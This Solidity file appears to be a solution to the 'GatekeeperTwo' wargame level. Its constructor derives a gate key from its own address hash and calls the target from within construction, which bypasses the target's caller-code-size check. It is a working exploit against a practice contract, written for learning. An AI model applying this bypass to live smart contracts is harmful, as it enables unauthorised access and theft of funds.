// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoSolution {
  GatekeeperTwo private gatekeeperTwo;

  event log_uint(uint256 i);
  event log_uint64(uint64 i);
  event log_b8(bytes8 b8);

  constructor(address _contract) {
    gatekeeperTwo = GatekeeperTwo(_contract);

    uint64 sender64 = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 sender64Not = ~sender64;
    bytes8 _gateKey = bytes8(sender64Not);

    emit log_uint64(sender64);
    emit log_uint64(sender64Not);
    emit log_uint64(type(uint64).max);
    emit log_b8(_gateKey);

    gatekeeperTwo.enter(_gateKey);
  }
}
